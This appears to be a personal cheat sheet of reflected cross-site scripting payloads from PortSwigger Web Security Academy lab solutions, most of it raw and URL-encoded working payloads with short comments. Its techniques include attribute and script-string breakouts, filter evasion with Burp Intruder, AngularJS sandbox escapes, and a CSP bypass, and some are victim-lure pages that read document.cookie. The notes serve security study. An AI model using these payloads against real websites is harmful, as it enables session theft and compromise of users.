
[ WEB > XSS > REFLECTED ]

// classic....
<script>alert(1)</script>

===

// test user input.
// determine input is reflected inside a quoted attribute...
// <input type="text" placeholder="Search the blog..." name="search" value="test123">
// let the hacking begin... lol
"onmouseover="alert(1)

// results in:
// <input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert(1)">
// and for some reason, no space is required between attributes after quote...

===

// in this case, user input gets reflected in javascript in the source.
// e.g.,
// <script>
//   var searchTerms = 'test123';
//   document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
// </script>
// inject directly into the script:
'-alert(1)-'

// results in:
var searchTerms = ''-alert(1)-'';

===

// try a standard vector...
<img src=1 onerror=print()>

// it gets blocked...
// use burp intruder to test a wide variety of tags and see what is allowed
// list can be found here:
// https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
// the intruder payload should look like:
GET /?search=<§§> HTTP/2

// we see that "body" and "custom tags" are allowed...
// now we'll use intruder again to test event payloads to see what is allowed:
// use the list from the same cheet sheet above...
<body%20§§=1>

// there are a number of payloads (events) that are allowed.
// let's use the onresize event.
// we craft our payload.
// we embed this on our own web server and try to get the victim to visit it.
// if the victim visits our page,
// the iframe loads the target site along with the xss payload
// since we control the iframe, we resize it, which triggers onresize
// and javascript excutes on the client for the target website.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>

// url encode relevant chars:
// need this to prevent problems with quotes, etc.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

===

// all tags except custom ones are blocked.
// example payload for this scenario:
<script>
location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>

// in the above, a custom tag is used to create an element with an id=x
// #x is appended to url that victim is redirected to in order to focus on element
// and trigger code.
// note: this is hosted on your attacker infra.
// link to the hosted page is delivered to the victim.
// url encode the payload, then deliver it:
<script>
location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

===

// standard payload gets blocked:
<img src=1 onerror=alert(1)>

// use burp intruder to test a list of any tags that are allowed (return 200)
// we determine that svg is allowed, in addition to animatetransform.
// we mold out our payload and then test any allowed events for the tag
// using burp intruder again with the events list for brute force.
<svg><animatetransform%20§§=1>

// turns out onbegin event is allowed.
// use that to finish creating the working payload.
// apparently, onbegin triggers when an animated svg begins playing.
<svg><animatetransform onbegin=alert(1)>

===

// target URL:
// apparently the app creates an element on the page
// we break out and bind accesskey and onclick events to trigger xss:
https://0a2500ef038c58f782cdec5e005d0038.web-security-academy.net/?'accesskey='x'onclick='alert(1)

===

// injection with quotes fails.
// they are escaped.
// break out of the entire script and start a new block:
</script><script>alert(1)</script>

===

// test inject, fails. quotes escaped.
// source reveals use of search string in javascript var.
var searchTerms = 'test\'123';

// escape using a leading backslash so their backslash is escaped by ours.
\'-alert(1)//

// resulting var expression becomes:
var searchTerms = '\\'-alert(1)//';

===

// search string gets embeded in template string:
var message = `0 search results for 'test123'`;

// leverage template expression to inject xss
${alert(1)}

===

Reflected XSS with AngularJS sandbox escape without strings

// payload:
// this is raw. make sure to url encode...
https://0a99003404c0d51780adb77c00cd0044.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

// This one's a bit complicated. I somewhat understood the tldr.
// But I'm just going to copy pasta the explanation from portswigger:

The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not. 

// url encoded (only certain chars...):
https://0a99003404c0d51780adb77c00cd0044.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

===

Reflected XSS with AngularJS sandbox escape and CSP

// host the following on your infra.
// link the victim to your page.
<script>
location='https://0a820017045f9aff8069535900db006c.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

// here's what it looks like with no url encoding:
<script>
location='https://0a820017045f9aff8069535900db006c.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
</script>

===

Reflected XSS with event handlers and href attributes blocked

// raw payload:
https://0a26001604ea976380a408dc004c003b.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

// url encoded:
https://0a26001604ea976380a408dc004c003b.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

===

Reflected XSS in a JavaScript URL with some characters blocked

// raw payload:
https://0a0d00c503757a0082e5426800cf00f4.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

// url encoded:
https://0a0d00c503757a0082e5426800cf00f4.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

===

Reflected XSS protected by CSP, with CSP bypass

// we try injecting.
// the content appears, but no payload executes
<img src=1 onerror=alert(1)>

// query appears in source as:
<h1>0 search results for '<img src=1 onerror=alert(1)>'</h1>

// note that in the response for the query,
// there is a CSP header which contains a token
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=

// since we can modify the token param, we can inject
// script-src-elem targets script elements
// unsafe-inline allows the use of inline scripts
// example raw payload:
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

